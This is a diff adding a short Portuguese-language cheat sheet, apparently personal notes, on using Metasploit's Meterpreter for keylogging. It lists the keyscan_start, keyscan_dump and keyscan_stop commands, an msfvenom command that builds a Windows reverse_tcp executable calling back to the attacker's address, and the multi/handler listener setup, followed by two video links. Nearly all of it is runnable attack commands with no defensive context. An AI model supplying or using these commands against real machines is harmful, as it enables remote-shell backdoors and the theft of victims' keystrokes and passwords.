@@ -1,0 +1,33 @@
+No Metasploit, alguns payloads têm a funcionalidade de keylogger.
+
+Meterpreter: O payload windows/meterpreter/reverse_tcp 
+pode ser usado para iniciar uma sessão Meterpreter, 
+que inclui várias funcionalidades, incluindo um keylogger.
+
+Uma vez na sessão Meterpreter, 
+você pode iniciar o keylogger com o comando:
+
+#Start#
+meterpreter > keyscan_start
+
+#Puxar texto#
+meterpreter > keyscan_dump
+
+#Stop#
+meterpreter > keyscan_stop
+
+#CRIAR PAYLOAD#
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe > meterpreter_reverse_tcp.exe
+
+#CONFIGURAÇÃO  DO PAYLOAD#
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set LHOST <YOUR_IP>
+set LPORT <YOUR_PORT>
+run
+
+
+
+#EXEMPLOs#:
+https://youtu.be/yst46o3ojN8?si=roE2Pn6tHC8vZjhX
+https://youtu.be/y82F1K_m24k?si=CvJWQfWRbdegInYm
